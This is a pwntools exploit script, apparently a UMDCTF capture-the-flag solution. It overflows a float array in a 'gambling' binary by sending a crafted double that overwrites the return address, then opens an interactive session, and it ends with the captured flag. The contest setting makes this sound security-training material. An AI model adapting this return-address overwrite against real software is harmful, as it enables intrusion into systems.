from pwn import *
import struct

context.arch = 'i386'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./gambling', '''
    b *(gamble+81)
    continue
''')

# p = remote('challs.umdctf.io', 31005)


# program reads in seven doubles to an array of floats
# key is to overwrite return address with target address by writing a double to the seventh position (index 6) of the array to overflow


target_address_in_hex = 0x080492c0
target_address_in_double = struct.unpack('<d', struct.pack('<Q', target_address_in_hex<<32))[0]
p.sendlineafter(b"Enter your lucky numbers: ", f' 0 0 0 0 0 0 {target_address_in_double}'.encode())

p.interactive()

# UMDCTF{99_percent_of_pwners_quit_before_they_get_a_shell_congrats_on_being_the_1_percent}